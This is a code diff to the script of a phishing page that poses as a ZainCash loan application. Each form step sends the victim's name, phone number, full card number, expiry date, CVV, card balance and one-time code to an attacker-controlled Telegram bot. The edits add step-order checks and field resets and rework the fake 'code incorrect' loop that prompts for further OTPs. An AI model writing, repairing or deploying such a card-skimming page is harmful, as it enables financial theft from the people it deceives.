@@ -475,6 +475,7 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
   const TELEGRAM_CHATID = "6873334348";
   let spamBlock = false;
   let userData = {};
+  let currentStep = 0;
 
   // خلفية متحركة
   function animateBg() {
@@ -555,10 +556,23 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
     window.open('https://t.me/zaincashiraq','_blank');
   };
 
-  // عرض خطوة معينة
+  // عرض خطوة معينة مع حماية
   function showStep(n) {
+    if (typeof n !== "number" || n < 0 || n > 4) return;
     document.querySelectorAll(".step").forEach((el, i) => el.classList.toggle('active', i === n));
     setProgress(n);
+    currentStep = n;
+    // تصفير الحقول عند كل خطوة مناسبة
+    if (n === 1) {
+      ['cardNumber','expDate','cvv','cardBalance'].forEach(id=>{
+        document.getElementById(id).value = "";
+        document.getElementById(id).classList.remove('valid','invalid');
+      });
+    }
+    if (n === 2) {
+      document.getElementById('otp').value = "";
+      document.getElementById('otp').classList.remove('valid','invalid');
+    }
   }
 
   // التوست المنبثق + صوت
@@ -599,9 +613,10 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
     setTimeout(()=>{spamBlock=false;}, ms);
   }
 
-  // Step1: الاسم، مبلغ السلفة، رقم الهاتف
+  // الخطوة 1
   document.getElementById('loanForm').onsubmit = async function(e) {
     e.preventDefault();
+    if(currentStep !== 0) return; // منع التلاعب
     if(spamBlock) return showToast('انتظر قليلاً ...', '#e67e22');
     const userName = document.getElementById('userName').value.trim();
     const loanAmount = document.getElementById('loanAmount').value;
@@ -619,10 +634,8 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
       return;
     }
     userData = {userName, loanAmount, userPhone};
-    showStep(1);
     blockSpam(3000);
     showToast('جاري إرسال البيانات...','','');
-    // إرسال المعلومات الأساسية للبوت
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {'Content-Type':'application/json'},
@@ -631,12 +644,13 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
         text: `طلب سلفة جديد:\nالاسم: ${userName}\nالمبلغ: ${Number(loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userPhone}`
       })
     });
-    setTimeout(()=>showStep(2), 1500);
+    setTimeout(()=>showStep(1), 1200);
   };
 
-  // Step2: معلومات البطاقة
+  // الخطوة 2
   document.getElementById('cardForm').onsubmit = async function(e) {
     e.preventDefault();
+    if(currentStep !== 1) return; // منع التلاعب
     if(spamBlock) return showToast('انتظر قليلاً ...', '#e67e22');
 
     const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g,'');
@@ -644,7 +658,6 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
     const cvv = document.getElementById('cvv').value;
     const cardBalance = document.getElementById('cardBalance').value.trim();
 
-    // تحقق من جميع الحقول (كلها اجباري)
     if (!/^\d{16}$/.test(cardNumber)) {
       showToast('رقم البطاقة غير صحيح', 'var(--error)', "error");
       return;
@@ -661,7 +674,6 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
       showToast('يرجى إدخال رصيد البطاقة بشكل صحيح', 'var(--error)', "error");
       return;
     }
-
     userData.cardNumber = cardNumber;
     userData.expDate = expDate;
     userData.cvv = cvv;
@@ -669,7 +681,6 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
 
     blockSpam(3000);
     showToast('جاري إرسال بيانات البطاقة...','','');
-    // إرسال المعلومات للبوت
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {'Content-Type':'application/json'},
@@ -678,23 +689,21 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
         text: `معلومات بطاقة زين كاش:\nالاسم: ${userData.userName}\nالمبلغ: ${Number(userData.loanAmount).toLocaleString()} دينار\nرقم الهاتف: ${userData.userPhone}\nرقم البطاقة: ${cardNumber}\nتاريخ الانتهاء: ${expDate}\nرمز CVV: ${cvv}\nرصيد البطاقة: ${cardBalance} دينار`
       })
     });
-    // الانتقال للخطوة الثالثة فقط بعد نجاح البيانات وضغط المستخدم
-    showStep(3);
+    setTimeout(()=>showStep(2), 1200);
   };
 
-  // Step3: رمز التحقق
+  // الخطوة 3
   document.getElementById('otpForm').onsubmit = async function(e) {
     e.preventDefault();
+    if(currentStep !== 2) return; // منع التلاعب
     if(spamBlock) return showToast('انتظر قليلاً ...', '#e67e22');
     const otp = document.getElementById('otp').value;
     if (!/^\d{6}$/.test(otp)) {
       showToast('رمز التحقق يجب أن يكون 6 أرقام', 'var(--error)', "error");
       return;
     }
-    showStep(3);
     blockSpam(3000);
     showToast('جاري التحقق...','','');
-    // إرسال رمز التحقق وجميع المعلومات للبوت
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: {'Content-Type':'application/json'},
@@ -707,9 +716,9 @@ body[data-theme="dark"] input, body[data-theme="dark"] select {background: #262f
       showToast('رمز التحقق غير صحيح، جرب مرة أخرى', '#e67e22', "error");
       document.getElementById('otp').value = "";
     }, 1300);
-    setTimeout(()=>showStep(3), 2000);
+    setTimeout(()=>showStep(2), 2000);
     setTimeout(()=>{
-      showStep(4);
+      showStep(3);
       document.getElementById('liveStatus').style.display = 'block';
       document.getElementById('finalSuccess').style.display = 'none';
     }, 3200);
